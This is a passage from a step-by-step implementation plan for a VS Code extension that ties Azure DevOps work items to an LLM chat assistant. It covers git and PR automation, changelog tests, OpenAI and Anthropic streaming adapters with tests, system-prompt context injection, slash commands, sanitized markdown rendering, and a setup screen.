/** Q5: push current branch and offer to create a PR (gh CLI). */
private async offerPushAndPr(workItemId: number, title: string, branch: string | null): Promise<void> {
  if (!branch) return;
  const choice = await vscode.window.showQuickPick(['Push branch & create PR', 'Push only', 'Skip'], {
    placeHolder: `Branch '${branch}' ready. Push / create PR?`,
    ignoreFocusOut: true,
  });
  if (!choice || choice === 'Skip') return;

  try {
    // M10 fix: check gh is installed + authenticated before offering the PR path.
    const { execFile } = require('child_process') as typeof import('child_process');
    if (choice === 'Push branch & create PR') {
      await new Promise<void>((resolve, reject) => {
        execFile('gh', ['auth', 'status'], { cwd: this.services.git.workspaceRoot }, err => err ? reject(new Error('gh not installed or not authenticated — run `gh auth login`')) : resolve());
      });
    }
    await new Promise<void>((resolve, reject) => {
      execFile('git', ['push', '-u', 'origin', branch], { cwd: this.services.git.workspaceRoot }, err => err ? reject(err) : resolve());
    });
    if (choice === 'Push branch & create PR') {
      await new Promise<void>((resolve, reject) => {
        execFile('gh', ['pr', 'create', '--title', `ADO-${workItemId}: ${title}`, '--body', `Completes ADO-${workItemId} — see work item for details.`], { cwd: this.services.git.workspaceRoot }, err => err ? reject(err) : resolve());
      });
      vscode.window.showInformationMessage(`ADO Code: pushed ${branch} and created PR.`);
    } else {
      vscode.window.showInformationMessage(`ADO Code: pushed ${branch}.`);
    }
  } catch (err) {
    vscode.window.showWarningMessage(`ADO Code: push/PR failed — do it manually (${err instanceof Error ? err.message : err}).`);
  }
}
```

Note: `this.activeWorkItem` is set by `selectWorkItem` (Task 13) — guard with
the `??` fallback here so Task 11 works standalone.

**Step 4: Write tests**

Create `src/test/suite/changelog/changelogService.test.ts`:
```typescript
import * as assert from 'assert';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { ChangelogService } from '../../../changelog/ChangelogService';

suite('ChangelogService', () => {
  let tmpDir: string;

  setup(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'adocode-changelog-'));
  });

  teardown(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  test('creates CHANGELOG.md when missing', async () => {
    const service = new ChangelogService(tmpDir);
    const filePath = await service.addEntry({
      workItemId: 42,
      title: 'Fix login bug',
      state: 'Done',
      date: '2026-08-02',
      workItemUrl: 'https://dev.azure.com/org/proj/_workitems/edit/42',
    });
    assert.ok(fs.existsSync(filePath));
    const content = fs.readFileSync(filePath, 'utf8');
    assert.ok(content.includes('## [Unreleased]'));
    assert.ok(content.includes('ADO-42'));
  });

  test('appends under Unreleased in existing file', async () => {
    fs.writeFileSync(path.join(tmpDir, 'CHANGELOG.md'),
      '# Changelog\n\n## [Unreleased]\n\n- old entry\n');
    const service = new ChangelogService(tmpDir);
    await service.addEntry({
      workItemId: 7,
      title: 'Add feature',
      state: 'Closed',
      date: '2026-08-02',
      workItemUrl: 'https://dev.azure.com/org/proj/_workitems/edit/7',
    });
    const content = fs.readFileSync(path.join(tmpDir, 'CHANGELOG.md'), 'utf8');
    assert.ok(content.includes('ADO-7'));
    assert.ok(content.indexOf('ADO-7') < content.indexOf('old entry'));
  });

  test('hasEntry is idempotent for same work item', async () => {
    const service = new ChangelogService(tmpDir);
    const entry = {
      workItemId: 99,
      title: 'X',
      state: 'Done',
      date: '2026-08-02',
      workItemUrl: 'u',
    };
    assert.strictEqual(service.hasEntry(99), false);
    await service.addEntry(entry);
    assert.strictEqual(service.hasEntry(99), true);
  });

  test('formatForAdo produces a comment-ready markdown block', async () => {
    const service = new ChangelogService(tmpDir);
    const text = service.formatForAdo({
      workItemId: 42,
      title: 'Fix login bug',
      state: 'Done',
      date: '2026-08-02',
      workItemUrl: 'https://dev.azure.com/org/proj/_workitems/edit/42',
    });
    assert.ok(text.includes('ADO-42'));
    assert.ok(text.includes('Fix login bug'));
    assert.ok(text.includes('**Changelog entry added'));
    assert.ok(text.includes('ADO Code'));
  });
});
```

**Step 5: Run tests and verify**

Run: `npm run compile && npm test`
Expected: All ChangelogService tests PASS

**Step 6: Commit**

```bash
git add -A
git commit -m "feat: auto-update CHANGELOG.md on task completion"
```

---

### Task 12: Implement LLM API Client with Provider Abstraction

**Objective:** Create an LLM client with a provider abstraction that supports both OpenAI-compatible and Anthropic-compatible APIs with streaming.

**Files:**
- Create: `src/llm/types.ts` (shared LLM types)
- Create: `src/llm/providers/openai.ts` (OpenAI-compatible adapter)
- Create: `src/llm/providers/anthropic.ts` (Anthropic Messages API adapter)
- Create: `src/llm/client.ts` (unified client that delegates to provider)

**Step 1: Define shared LLM types**

Create `src/llm/types.ts`:
```typescript
export type LlmProviderType = 'openai' | 'anthropic';

export interface LlmMessage {
  role: 'system' | 'user' | 'assistant' | 'tool';
  content: string;
  // C1 fix: tool-calling metadata carried on the generic message so the
  // provider can translate 1:1 to its native shape.
  toolCallId?: string;   // present on role:'tool' messages (OpenAI tool_call_id / Anthropic tool_use_id)
  toolCalls?: Array<{ id: string; name: string; arguments: string }>; // present on assistant messages that invoked tools
}

export interface LlmStreamChunk {
  content: string;
  done: boolean;
}

export interface LlmConfig {
  provider: LlmProviderType;
  apiUrl: string;
  apiKey: string;
  model: string;
}

export interface LlmProvider {
  streamChat(messages: LlmMessage[], config: LlmConfig, signal?: AbortSignal): AsyncGenerator<LlmStreamChunk>;
}
```

**Step 2: Implement OpenAI-compatible provider**

Create `src/llm/providers/openai.ts`:
```typescript
import { LlmMessage, LlmStreamChunk, LlmConfig, LlmProvider } from '../types';

export class OpenAiProvider implements LlmProvider {
  async *streamChat(messages: LlmMessage[], config: LlmConfig, signal?: AbortSignal): AsyncGenerator<LlmStreamChunk> {
    const response = await fetch(`${config.apiUrl}/chat/completions`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${config.apiKey}`,
      },
      signal,
      body: JSON.stringify({
        model: config.model,
        messages,
        stream: true,
      }),
    });

    if (!response.ok) {
      throw new Error(`OpenAI API error: ${response.status} ${await response.text()}`);
    }

    const reader = response.body?.getReader();
    if (!reader) throw new Error('No response body');

    const decoder = new TextDecoder();
    let buffer = '';

    while (true) {
      const { done, value } = await reader.read();
      if (done) break;

      buffer += decoder.decode(value, { stream: true });
      const lines = buffer.split('\n');
      buffer = lines.pop() || '';

      for (const rawLine of lines) {
        // Robust SSE: trim CRLF and match `data:` with optional space
        // (Azure OpenAI sends `data:{...}` with no space).
        const line = rawLine.trim();
        const match = line.match(/^data: ?(.*)$/);
        if (match) {
          const data = match[1];
          if (data === '[DONE]') {
            yield { content: '', done: true };
            return;
          }
          try {
            const parsed = JSON.parse(data);
            const content = parsed.choices?.[0]?.delta?.content || '';
            if (content) {
              yield { content, done: false };
            }
          } catch {
            // Skip malformed JSON
          }
        }
      }
    }
  }
}
```

**Step 3: Implement Anthropic Messages API provider**

Create `src/llm/providers/anthropic.ts`:
```typescript
import { LlmMessage, LlmStreamChunk, LlmConfig, LlmProvider } from '../types';

export class AnthropicProvider implements LlmProvider {
  async *streamChat(messages: LlmMessage[], config: LlmConfig, signal?: AbortSignal): AsyncGenerator<LlmStreamChunk> {
    // Anthropic uses a separate system prompt, not in messages array
    const systemMessage = messages.find(m => m.role === 'system');
    const nonSystemMessages = messages.filter(m => m.role !== 'system');

    // Convert to Anthropic format; the Messages API REQUIRES strictly
    // alternating user/assistant roles, so merge consecutive same-role turns.
    const anthropicMessages: Array<{ role: 'user' | 'assistant'; content: string }> = [];
    for (const m of nonSystemMessages) {
      const role = m.role as 'user' | 'assistant';
      const last = anthropicMessages[anthropicMessages.length - 1];
      if (last && last.role === role) {
        last.content += '\n\n' + m.content;
      } else {
        anthropicMessages.push({ role, content: m.content });
      }
    }

    // Normalize base URL: accept https://api.anthropic.com OR .../v1
    const baseUrl = config.apiUrl.replace(/\/+$/, '').replace(/\/v1$/, '');

    const body: Record<string, any> = {
      model: config.model,
      max_tokens: 4096,
      messages: anthropicMessages,
      stream: true,
    };

    if (systemMessage) {
      body.system = systemMessage.content;
    }

    const response = await fetch(`${baseUrl}/v1/messages`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-api-key': config.apiKey,
        'anthropic-version': '2023-06-01',
      },
      signal,
      body: JSON.stringify(body),
    });

    if (!response.ok) {
      throw new Error(`Anthropic API error: ${response.status} ${await response.text()}`);
    }

    const reader = response.body?.getReader();
    if (!reader) throw new Error('No response body');

    const decoder = new TextDecoder();
    let buffer = '';

    while (true) {
      const { done, value } = await reader.read();
      if (done) break;

      buffer += decoder.decode(value, { stream: true });
      const lines = buffer.split('\n');
      buffer = lines.pop() || '';

      for (const rawLine of lines) {
        const line = rawLine.trim();
        const match = line.match(/^data: ?(.*)$/);
        if (match) {
          const data = match[1];
          if (data === '[DONE]') {
            yield { content: '', done: true };
            return;
          }
          try {
            const parsed = JSON.parse(data);
            if (parsed.type === 'content_block_delta') {
              const content = parsed.delta?.text || '';
              if (content) {
                yield { content, done: false };
              }
            } else if (parsed.type === 'message_stop') {
              yield { content: '', done: true };
              return;
            }
          } catch {
            // Skip malformed JSON
          }
        }
      }
    }
  }
}
```

**Step 4: Create unified LLM client with provider dispatch**

Create `src/llm/client.ts`:
```typescript
import { LlmMessage, LlmStreamChunk, LlmConfig, LlmProvider, LlmProviderType } from './types';
import { OpenAiProvider } from './providers/openai';
import { AnthropicProvider } from './providers/anthropic';

const providers: Record<LlmProviderType, LlmProvider> = {
  openai: new OpenAiProvider(),
  anthropic: new AnthropicProvider(),
};

export class LlmClient {
  private provider: LlmProvider;

  constructor(private config: LlmConfig) {
    this.provider = providers[config.provider];
    if (!this.provider) {
      throw new Error(`Unknown LLM provider: ${config.provider}`);
    }
  }

  async *streamChat(messages: LlmMessage[], signal?: AbortSignal): AsyncGenerator<LlmStreamChunk> {
    yield* this.provider.streamChat(messages, this.config, signal);
  }
}
```

**Step 5: Add provider unit tests with mocked fetch**

The SSE parsing in both providers is the most bug-prone logic in the plan — it
must be tested. Create `src/test/suite/llm/providers.test.ts` with a stubbed
`global.fetch` returning a canned `ReadableStream`:

```typescript
import * as assert from 'assert';
import { OpenAiProvider } from '../../../llm/providers/openai';
import { AnthropicProvider } from '../../../llm/providers/anthropic';
import { LlmConfig, LlmMessage } from '../../../llm/types';

function sseStream(chunks: string[]): ReadableStream<Uint8Array> {
  const encoder = new TextEncoder();
  return new ReadableStream({
    start(controller) {
      chunks.forEach(c => controller.enqueue(encoder.encode(c)));
      controller.close();
    },
  });
}

const config: LlmConfig = {
  provider: 'openai',
  apiUrl: 'https://api.example.com/v1',
  apiKey: 'test-key',
  model: 'test-model',
};

suite('OpenAiProvider', () => {
  test('parses SSE chunks and [DONE]', async () => {
    const fetchStub = async () => ({
      ok: true,
      body: sseStream([
        'data: {"choices":[{"delta":{"content":"Hel"}}]}\n\n',
        'data: {"choices":[{"delta":{"content":"lo"}}]}\n\n',
        'data: [DONE]\n\n',
      ]),
    });
    (globalThis as any).fetch = fetchStub;

    const provider = new OpenAiProvider();
    const chunks = [];
    for await (const c of provider.streamChat([], config)) {
      chunks.push(c);
    }
    assert.deepStrictEqual(chunks, [
      { content: 'Hel', done: false },
      { content: 'lo', done: false },
      { content: '', done: true },
    ]);
  });

  test('tolerates CRLF and data: without space (Azure style)', async () => {
    const fetchStub = async () => ({
      ok: true,
      body: sseStream([
        'data:{"choices":[{"delta":{"content":"x"}}]}\r\n\r\n',
        'data:[DONE]\r\n\r\n',
      ]),
    });
    (globalThis as any).fetch = fetchStub;

    const provider = new OpenAiProvider();
    const chunks = [];
    for await (const c of provider.streamChat([], config)) {
      chunks.push(c);
    }
    assert.strictEqual(chunks[0].content, 'x');
    assert.strictEqual(chunks[chunks.length - 1].done, true);
  });
});

suite('AnthropicProvider', () => {
  const anthropicConfig: LlmConfig = { ...config, provider: 'anthropic', apiUrl: 'https://api.anthropic.com' };
  const messages: LlmMessage[] = [
    { role: 'system', content: 'sys' },
    { role: 'user', content: 'hi' },
  ];

  test('posts to /v1/messages with normalized URL and required headers', async () => {
    let captured: any;
    const fetchStub = async (url: any, init: any) => {
      captured = { url, init };
      return {
        ok: true,
        body: sseStream([
          'data: {"type":"content_block_delta","delta":{"text":"Hey"}}\n\n',
          'data: {"type":"message_stop"}\n\n',
        ]),
      };
    };
    (globalThis as any).fetch = fetchStub;

    const provider = new AnthropicProvider();
    const chunks = [];
    for await (const c of provider.streamChat(messages, anthropicConfig)) {
      chunks.push(c);
    }
    assert.strictEqual(captured.url, 'https://api.anthropic.com/v1/messages');
    assert.strictEqual(captured.init.headers['x-api-key'], 'test-key');
    assert.ok(captured.init.headers['anthropic-version']);
    assert.strictEqual(JSON.parse(captured.init.body).system, 'sys');
    assert.strictEqual(chunks[chunks.length - 1].done, true);
  });

  test('merges consecutive same-role messages', async () => {
    let captured: any;
    const fetchStub = async (_url: any, init: any) => {
      captured = init;
      return { ok: true, body: sseStream(['data: {"type":"message_stop"}\n\n']) };
    };
    (globalThis as any).fetch = fetchStub;

    const provider = new AnthropicProvider();
    const sameRole: LlmMessage[] = [
      { role: 'user', content: 'a' },
      { role: 'user', content: 'b' },
    ];
    await provider.streamChat(sameRole, anthropicConfig).next();
    const body = JSON.parse(captured.body);
    assert.strictEqual(body.messages.length, 1);
    assert.strictEqual(body.messages[0].content, 'a\n\nb');
  });
});
```

**Step 6: Verify**

Run: `npm run compile`
Expected: Clean compilation

**Step 7: Commit**

```bash
git add -A
git commit -m "feat: LLM provider abstraction with OpenAI + Anthropic + stream tests"
```

---

### Task 13: Wire LLM Client to ChatProvider with System Prompt

**Objective:** Connect the LLM client to the chat flow, injecting ADO work item context into the system prompt.

**Files:**
- Modify: `src/webview/ChatViewProvider.ts`
- Create: `src/llm/prompts.ts`

**Step 1: Create prompt templates**

Create `src/llm/prompts.ts`:
```typescript
import { WorkItemContext } from '../shared/messages';

export function buildSystemPrompt(activeWorkItem?: WorkItemContext): string {
  let prompt = `You are ADO Code, an AI coding assistant integrated into VS Code.
You help developers write, understand, and debug code.
You have access to the developer's Azure DevOps work items.
When the user references a task, use its description, acceptance criteria, AND the discussion thread (especially any clarification Q&A) to guide your assistance.
Be concise, helpful, and focused on code.`;

  if (activeWorkItem) {
    prompt += `\n\nCurrent work item: #${activeWorkItem.id} - ${activeWorkItem.title}
Description: ${activeWorkItem.description || 'N/A'}
Acceptance Criteria: ${activeWorkItem.acceptanceCriteria || 'N/A'}
Tags: ${activeWorkItem.tags || 'N/A'}`;

    if (activeWorkItem.comments && activeWorkItem.comments.length > 0) {
      prompt += `\n\nDiscussion thread (latest first):`;
      for (const c of activeWorkItem.comments.slice().reverse()) {
        prompt += `\n- ${c.author}: ${c.text}`;
      }
    }
  }

  return prompt;
}
```
The `comments` array is populated by `selectWorkItem`/`reviewTaskDetail` (Task 28)
whenever the work item detail is fetched, so clarification Q&A on the thread
automatically flows into every subsequent LLM turn.

**Step 2: Update ChatViewProvider to stream LLM responses**

Modify the `userMessage` handler to:
1. Build system prompt with the currently selected work item (set by `selectWorkItem`, below)
2. Build `LlmConfig` from settings — including `provider` (`'openai' | 'anthropic'`) from `adoCode.llmProvider`
3. Construct `LlmClient` with that config (provider dispatch happens internally)
4. Stream response chunks back to webview, accumulating into one assistant bubble via the `done` flag

**Step 3: Add active work item state + selectWorkItem handler**

The headline ADO-context-injection feature needs a state holder. C-4 fix:
`activeWorkItem` is ALREADY declared in Task 10 — this task only refines its
TYPE shape via `selectWorkItem` (no re-declaration):

```typescript
/** Called from the tree view command (Task 9). Fetches detail + thread and posts to webview. */
async selectWorkItem(workItemId: number): Promise<void> {
  try {
    const project = this.activeProject(); // H-4
    const { detail, comments } = await this.services.ado.getWorkItemWithDiscussion(project, workItemId);
    this.activeWorkItem = {
      id: detail.id,
      title: detail.fields['System.Title'],
      description: detail.fields['System.Description'] || '',
      acceptanceCriteria: detail.fields['Microsoft.VSTS.Common.AcceptanceCriteria'] || '',
      tags: detail.fields['System.Tags'] || '',
      comments: comments.map(c => ({ author: c.createdBy.displayName, text: c.text, date: c.createdDate })),
    };
    this.postMessage({ type: 'workItemDetail', item: {
      id: this.activeWorkItem.id,
      title: this.activeWorkItem.title,
      state: detail.fields['System.State'],
      assignedTo: detail.fields['System.AssignedTo']?.displayName ?? '',
      workItemType: detail.fields['System.WorkItemType'],
      description: this.activeWorkItem.description,
      acceptanceCriteria: this.activeWorkItem.acceptanceCriteria,
      tags: this.activeWorkItem.tags,
      areaPath: detail.fields['System.AreaPath'] ?? '',
      iterationPath: detail.fields['System.IterationPath'] ?? '',
      comments: this.activeWorkItem.comments ?? [],
    }});
  } catch (err) {
    const message = err instanceof Error ? err.message : String(err);
    this.postMessage({ type: 'error', message });
  }
}
```
Note: `getWorkItemWithDiscussion` is defined in Task 7 (H1 fix) — Task 13 uses
it so the thread (including clarification Q&A) is always part of
`activeWorkItem` and therefore part of every system prompt.

**Step 4: Stream LLM responses with cancellation**

Add a `streamChatCompletion` method (used by the `userMessage` handler):

```typescript
private llmAbort?: AbortController;

private async handleUserMessage(content: string): Promise<void> {
  // Cancel any in-flight stream before starting a new one
  this.llmAbort?.abort();
  const abort = new AbortController();
  this.llmAbort = abort;

  const settings = getSettings();
  const llmConfig: LlmConfig = {
    provider: settings.llmProvider,
    apiUrl: settings.llmApiUrl,
    apiKey: settings.llmApiKey,
    model: settings.llmModel,
  };
  const client = new LlmClient(llmConfig);
  const messages: LlmMessage[] = [
    { role: 'system', content: buildSystemPrompt(this.activeWorkItem) },
    { role: 'user', content },
  ];

  try {
    for await (const chunk of client.streamChat(messages, abort.signal)) {
      this.postMessage({ type: 'assistantMessage', content: chunk.content, done: chunk.done });
      if (chunk.done) break;
    }
  } catch (err) {
    if (abort.signal.aborted) return; // cancelled by a newer message
    const message = err instanceof Error ? err.message : String(err);
    this.postMessage({ type: 'error', message });
  }
}
```

Note: `LlmConfig`/`LlmClient`/`LlmMessage` come from `src/llm/*` (Task 12). The
`AbortController` is threaded through `LlmProvider.streamChat` — both providers
must accept an optional `signal` and pass it to `fetch` (add `signal` to the
`streamChat` signature in `src/llm/types.ts` and both providers in Task 12).

**Step 5: Add the llmClient factory + conversation field (H-1/H-2 fix)**

Task 24's mode-aware dispatch calls `this.llmClient()` and reads
`this.conversation` — define BOTH here so those tasks compile:

```typescript
// In ChatViewProvider:
// `llmAbort` is ALREADY declared in Step 4 — do NOT re-declare (TS2300).
private conversation: LlmMessage[] = [];

/** Fresh client from current settings (avoids stale config after changes). */
private llmClient(): LlmClient {
  return new LlmClient(llmConfigFromSettings());
}
```
(`llmConfigFromSettings()` reads `adoCode.llmProvider/llmApiUrl/llmApiKey/llmModel`
into an `LlmConfig` — define it in `src/config/settings.ts`.)

**Step 6: Mode selector + tool-aware message flow (Q8)**

Wire the mode into the chat flow so `inline`/`plan`/`act` actually change
behavior (the `ToolExecutor` gating lives in Task 21):

- Chat header gets a mode QuickPick (inline / plan / act), defaulting to
  `adoCode.mode`. M-5 fix: selecting it must BOTH update the setting AND call
  `executor.setMode(mode)`:
  ```typescript
  const pick = await vscode.window.showQuickPick(['inline', 'plan', 'act'], { placeHolder: `Mode: ${getSettings().mode}` });
  if (pick) {
    await vscode.workspace.getConfiguration('adoCode').update('mode', pick, vscode.ConfigurationTarget.Global);
    this.executor?.setMode(pick as any); // executor wired in Task 24; optional here
    this.postMessage({ type: 'modeChanged', mode: pick as any });
  }
  ```
- M-5 fix: add `{ type: 'beginImplementation' }` (Webview → Extension) and
  `{ type: 'planReady'; plan: string }` (already present) to the protocol; the
  "Begin implementation" button posts `beginImplementation`, whose handler
  switches mode to `act` and re-runs the last user message.
- `handleUserMessage` switches on mode:
  - `inline` — current behavior (stream + inline tool results).
  - `plan` — run the agentic loop with read-only tools; when the LLM finishes,
    show a "Begin implementation" button that switches to `act` and re-runs the
    same user message.
  - `act` — run the agentic loop to completion, streaming each tool call +
    result, with a Stop button (aborts via the shared AbortController) and a
    tool budget (from `adoCode.act.toolBudget`).
- The webview renders tool-call cards (tool name + args + result) inline so the
  user sees what the agentic loop is doing.

**Step 7: Verify**

Run: `npm run compile`
Expected: Clean compilation

**Step 8: Commit**

```bash
git add -A
git commit -m "feat: wire LLM client to chat with ADO context injection + modes"
```

**Note:** No changes needed in ChatViewProvider when switching providers — the user just changes the `adoCode.llmProvider` setting. The same `streamChat(messages)` call works for both. Providers are instantiated lazily or cached per session; recreate `LlmClient` when settings change (listen for `vscode.workspace.onDidChangeConfiguration`).

---

### Task 14: Add ADO Task Actions (Update State, Add Comment)

**Objective:** Enable users to update work item state and add comments from the chat interface.

**Files:**
- Modify: `src/webview/ChatViewProvider.ts`
- Modify: `src/ado/client.ts`

**Step 1: Add action commands**

Add to ChatViewProvider message handlers:
- `updateWorkItem` message: delegate to `updateWorkItemState(id, newState)` built in Task 11 (which already handles the state PATCH, the changelog hook, and the ADO comment; note System.History is read-only in ADO — C9)
- `addComment` message: call `adoClient.addComment(project, id, text)` and post confirmation to the webview

**Step 2: Add slash-command parsing (and wire to message handler)**

Add a small parser in the `userMessage` handler, BEFORE sending to the LLM:

```typescript
// Inside the `userMessage` handler:
const statusMatch = content.match(/^\/status\s+(\S+)/);
if (statusMatch) {
  if (this.activeWorkItem) {
    await this.updateWorkItemState(this.activeWorkItem.id, statusMatch[1]);
  } else {
    vscode.window.showWarningMessage('ADO Code: select a work item first (tree view → Select Work Item).');
  }
  return; // do not send slash command to the LLM
}

const commentMatch = content.match(/^\/comment\s+([\s\S]+)/);
if (commentMatch) {
  if (this.activeWorkItem) {
    const project = this.activeProject(); // H-4
    await this.services.ado.addComment(project, this.activeWorkItem.id, commentMatch[1].trim());
    vscode.window.showInformationMessage(`ADO Code: comment added to ADO-${this.activeWorkItem.id}.`);
  } else {
    vscode.window.showWarningMessage('ADO Code: select a work item first.');
  }
  return;
}
```

**Step 3: Verify**

Run: `npm run compile`
Expected: Clean compilation

**Step 4: Commit**

```bash
git add -A
git commit -m "feat: add slash commands for work item status and comments"
```

---

## Phase 3: Polish & UX (Tasks 15-20)

### Task 15: Add Markdown Rendering in Chat

**Objective:** Render markdown in assistant messages (code blocks, bold, lists).

**Files:**
- Create: `src/webview-ui/src/components/MarkdownRenderer.tsx`
- Modify: `src/webview-ui/src/App.tsx`
- Modify: `src/webview-ui/package.json` (add `marked` dependency)

**Step 1: Install marked**

Add to webview-ui dependencies: `"marked": "^12.0.0"` and `"dompurify": "^3.1.0"`

**Step 2: Create MarkdownRenderer component**

```tsx
import React, { useEffect, useRef } from 'react';
import { marked } from 'marked';
import DOMPurify from 'dompurify'; // H-9 fix: import the sanitizer

interface Props {
  content: string;
}

export function MarkdownRenderer({ content }: Props) {
  const ref = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (ref.current) {
      // SECURITY: marked does NOT sanitize; LLM output is untrusted and may
      // contain raw HTML. DOMPurify strips scripts/event handlers before the
      // HTML touches the DOM (paired with the webview CSP from Task 3).
      const raw = marked.parse(content) as string;
      ref.current.innerHTML = DOMPurify.sanitize(raw);
    }
  }, [content]);

  return <div ref={ref} className="markdown-body" />;
}
```

**Step 3: Add basic CSS for markdown**

Create `src/webview-ui/src/styles/markdown.css` with styles for code blocks, etc.

**Step 4: Commit**

```bash
git add -A
git commit -m "feat: add markdown rendering in chat messages"
```

---

### Task 16: Add Code Context Injection

**Objective:** Automatically include active file content and selection in LLM context.

**Files:**
- Modify: `src/webview/ChatViewProvider.ts`

**Step 1: Get active editor context**

When sending a message, include:
- Active file path and language
- Selected text (if any)
- Visible range of the editor

**Step 2: Format as context block**

Prepend to the user message:
```
[Context: file: src/main.ts, language: typescript]
[Selected code:]
const x = 1;
[/Selected code]

[User message:]
How do I refactor this?
```

**Step 3: Commit**

```bash
git add -A
git commit -m "feat: inject active file and selection as LLM context"
```

---

### Task 17: Add Keyboard Shortcuts and Commands

**Objective:** Register keybindings for common actions.

**Files:**
- Modify: `package.json` (add keybindings and commands)
- Modify: `src/extension.ts` (implement `adoCode.chat.focus`)

**Step 1: Add keybindings**

```json
"keybindings": [
  {
    "command": "adoCode.chat.focus",
    "key": "ctrl+shift+a",
    "mac": "cmd+shift+a"
  },
  {
    "command": "adoCode.refreshWorkItems",
    "key": "ctrl+shift+r",
    "mac": "cmd+shift+r"
  }
]
```

**Step 2: Add commands**

```json
"adoCode.chat.focus": {
  "command": "adoCode.chat.focus",
  "title": "Focus Chat"
},
"adoCode.refreshWorkItems": {
  "command": "adoCode.refreshWorkItems",
  "title": "Refresh Work Items"
}
```

**Step 3: Implement chat.focus in extension.ts**

The keybinding is useless without a registered command that reveals the chat view:

```typescript
context.subscriptions.push(
  vscode.commands.registerCommand('adoCode.chat.focus', () => chatProvider.focus())
);
```

H12 fix: `adoCode.chat.focusView` is NOT a real command — use the built-in
view-container command instead. In `ChatViewProvider.focus()`:
```typescript
public focus(): void {
  // Built-in command reveals the whole adoCode view container + focuses the chat view.
  vscode.commands.executeCommand('workbench.view.extension.adoCode');
  this._view?.show?.(true);
}
```

**Step 4: Add status-bar branch indicator**

The verification step in Task 20 tests a branch indicator — build it here so the
test is real. Add to `extension.ts`:

```typescript
const statusBar = vscode.window.createStatusBarItem(vscode.StatusBarAlignment.Left, 100);
statusBar.command = 'adoCode.refreshWorkItems';
statusBar.tooltip = 'ADO Code: current task branch';
statusBar.show();

// Update it whenever the git branch changes (poll on window focus + workspace events)
async function updateBranchStatus(): Promise<void> {
  const branch = await services.git.getCurrentBranch();
  statusBar.text = branch ? `$(git-branch) ${branch}` : '$(git-branch) (no repo)';
}

context.subscriptions.push(
  vscode.window.onDidChangeWindowState(() => updateBranchStatus()),
  vscode.workspace.onDidChangeConfiguration(() => updateBranchStatus())
);
void updateBranchStatus();
```

Note: `services.git` refers to the services bundle from Task 8. The status bar
shows the current branch (e.g. `feature/ADO-1234-fix-login-bug`) so the user
sees which task they're on at a glance.

**Step 5: Commit**

```bash
git add -A
git commit -m "feat: add keyboard shortcuts, chat focus command, branch status bar"
```

---

### Task 18: Add Loading States and Error Handling

**Objective:** Show loading indicators, handle API errors gracefully, and display user-friendly messages.

**Files:**
- Modify: `src/webview-ui/src/App.tsx`
- Modify: `src/webview/ChatViewProvider.ts`

**Step 1: Add loading spinner component**

Create `src/webview-ui/src/components/LoadingSpinner.tsx`

**Step 2: Add error toast handling**

When ADO or LLM calls fail, post error message to webview and show VS Code notification.

**Step 3: Commit**

```bash
git add -A
git commit -m "feat: add loading states and error handling"
```

---

### Task 19: Add Welcome View for Unconfigured State

**Objective:** Show setup instructions when ADO/LLM settings are not configured.

**Files:**
- Modify: `src/webview/ChatViewProvider.ts` (render welcome HTML when unconfigured)
- Modify: `src/webview-ui/src/App.tsx` (welcome screen UI)
- Modify: `package.json` (no new view — reuse the existing chat view)

**Step 1: Design decision — single provider, two render modes**

IMPORTANT: sidebar views are static contributions — you cannot conditionally
register/hide a `WebviewView`. The implementable design is ONE provider whose
webview renders either the welcome screen or the chat UI depending on config.

**Step 2: Render welcome when unconfigured**

In `ChatViewProvider`, check config at resolve time and render the appropriate
HTML (the webview app can also decide client-side — it receives `config` via the
existing `getConfig`/`config` message):

```typescript
resolveWebviewView(webviewView, _context, _token) {
  this._view = webviewView;
  webviewView.webview.options = { enableScripts: true, localResourceRoots: [this._extensionUri] };
  webviewView.webview.html = this._getHtmlForWebview(webviewView.webview);
  // React app in the webview decides welcome-vs-chat from the config payload:
  this.postMessage({ type: 'config', config: this._sanitizedConfig() });
  // ...message handlers as before
}

/** Never send adoPat/llmApiKey to the webview — secrets stay in the host. */
private _sanitizedConfig() {
  const s = getSettings();
  return {
    adoOrganization: s.adoOrganization,
    adoProject: s.adoProject,
    llmProvider: s.llmProvider,
    llmApiUrl: s.llmApiUrl,
    llmModel: s.llmModel,
    configured: Boolean(s.adoOrganization && s.adoProject && s.adoPat && s.llmApiKey),
  };
}
```

Welcome screen shows:
- Link to create ADO PAT
- Input fields for organization, project, PAT
- LLM setup: provider dropdown (`openai` / `anthropic`), API URL, API key, model
- Instructions for LLM API setup (including common self-hosted endpoints like Ollama `http://localhost:11434/v1`, LM Studio `http://localhost:1234/v1`)
- Git workflow toggles: "Require git repository", "Create branch on task start", "Update changelog on completion", "Post changelog to ADO work item" — with brief explanations of each

**Step 3: Save settings from the welcome screen**

Handle `updateConfig` in the extension host (never echo secrets back):

```typescript
case 'updateConfig': {
  const cfg = vscode.workspace.getConfiguration('adoCode');
  const { config } = message; // Partial<ExtensionConfig> from webview
  if (config.adoOrganization !== undefined) await cfg.update('adoOrganization', config.adoOrganization, vscode.ConfigurationTarget.Global);
  if (config.adoProject !== undefined) await cfg.update('adoProject', config.adoProject, vscode.ConfigurationTarget.Global);
  if (config.adoPat !== undefined) await cfg.update('adoPat', config.adoPat, vscode.ConfigurationTarget.Global);
  if (config.llmProvider !== undefined) await cfg.update('llmProvider', config.llmProvider, vscode.ConfigurationTarget.Global);
  if (config.llmApiUrl !== undefined) await cfg.update('llmApiUrl', config.llmApiUrl, vscode.ConfigurationTarget.Global);
  if (config.llmApiKey !== undefined) await cfg.update('llmApiKey', config.llmApiKey, vscode.ConfigurationTarget.Global);
  if (config.llmModel !== undefined) await cfg.update('llmModel', config.llmModel, vscode.ConfigurationTarget.Global);
  // git/changelog booleans likewise...
  this.postMessage({ type: 'config', config: this._sanitizedConfig() }); // refreshed, still no secrets
  break;
}
```

**Step 4: Commit**

```bash
git add -A
git commit -m "feat: welcome view with setup flow (single provider, dual mode)"
```

---

### Task 20: Final Integration Testing and Polish

**Objective:** Verify the complete extension works end-to-end.

**Files:**
- Modify: various (bug fixes)

**Step 1: Full build**

Run: `npm run build:all`
Expected: Clean build

**Step 2: Extension Development Host test**

Run in VS Code: Press F5 to launch Extension Development Host
Expected: Extension loads, sidebar shows Chat and Work Items views

**Step 3: Test ADO connection**

